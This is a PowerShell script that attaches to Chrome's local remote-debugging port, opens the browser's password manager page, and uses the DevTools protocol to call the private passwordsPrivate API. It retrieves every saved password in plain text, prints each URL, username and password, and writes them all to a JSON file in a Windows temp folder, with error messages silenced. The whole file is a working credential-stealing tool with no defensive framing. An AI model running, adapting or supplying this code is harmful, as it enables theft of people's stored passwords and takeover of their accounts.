$ErrorActionPreference = 'SilentlyContinue'

# Find the password manager page
$targets = (curl.exe -s http://127.0.0.1:9222/json/list | ConvertFrom-Json)
$pm = $targets | Where-Object { $_.url -match 'password' } | Select-Object -First 1
if (-not $pm) { Write-Output "no PM page"; exit }

Write-Output "[*] PM page: $($pm.url)"
Write-Output "[*] ws: $($pm.webSocketDebuggerUrl)"

# Connect to the PM page's WebSocket
$ws = New-Object System.Net.WebSockets.ClientWebSocket
$ct = [System.Threading.CancellationToken]::None
$ws.ConnectAsync([Uri]$pm.webSocketDebuggerUrl, $ct).Wait()
Write-Output "[*] connected: $($ws.State)"

Start-Sleep 5

$buf = [byte[]]::new(10485760)
$script:id = 1

function Eval {
    param([string]$js)
    $script:id++
    $m = @{
        id = $script:id
        method = "Runtime.evaluate"
        params = @{
            expression = $js
            awaitPromise = $true
            returnByValue = $true
        }
    }
    $json = ConvertTo-Json -Compress -InputObject $m -Depth 5
    $b = [System.Text.Encoding]::UTF8.GetBytes($json)
    $s = [ArraySegment[byte]]::new($b)
    $ws.SendAsync($s, [System.Net.WebSockets.WebSocketMessageType]::Text, $true, $ct).Wait()
    $s2 = [ArraySegment[byte]]::new($buf)
    $r = $ws.ReceiveAsync($s2, $ct).Result
    return [System.Text.Encoding]::UTF8.GetString($buf, 0, $r.Count)
}

# Get saved password list
Write-Output "[*] getting password list..."
$listResp = Eval 'new Promise(r => chrome.passwordsPrivate.getSavedPasswordList(l => r(JSON.stringify(l))))'
Write-Output "[*] raw: $($listResp.Substring(0, [Math]::Min(300, $listResp.Length)))"

$listObj = $listResp | ConvertFrom-Json
$listStr = $listObj.result.result.value
if (-not $listStr) {
    Write-Output "no list value in response"
    # try to find passwords in the response structure
    Write-Output "full response: $($listResp.Substring(0, [Math]::Min(500, $listResp.Length)))"
    $ws.Dispose()
    exit
}

$passwords = $listStr | ConvertFrom-Json
Write-Output "[+] $($passwords.Count) passwords"

$results = @()
foreach ($entry in $passwords) {
    $pidNum = $entry.id
    $u = $entry.urls[0]
    $n = $entry.username
    Write-Output "[*] getting pwd $pidNum for $u..."
    $pwResp = Eval "new Promise(r => chrome.passwordsPrivate.getPlaintextPassword($pidNum, pw => r(pw)))"
    $pwObj = $pwResp | ConvertFrom-Json
    $pw = $pwObj.result.result.value
    $results += @{url=$u; user=$n; pass=$pw}
    Write-Output "  -> $u | $n | $pw"
}

Write-Output ""
Write-Output "=== ALL ==="
foreach ($r in $results) { Write-Output "$($r.url) | $($r.user) | $($r.pass)" }

$all = $results | ConvertTo-Json -Depth 3
$all | Out-File C:\Windows\Temp\ziti\pwd_final.json -Encoding utf8
Write-Output "[+] saved to pwd_final.json"

$ws.Dispose()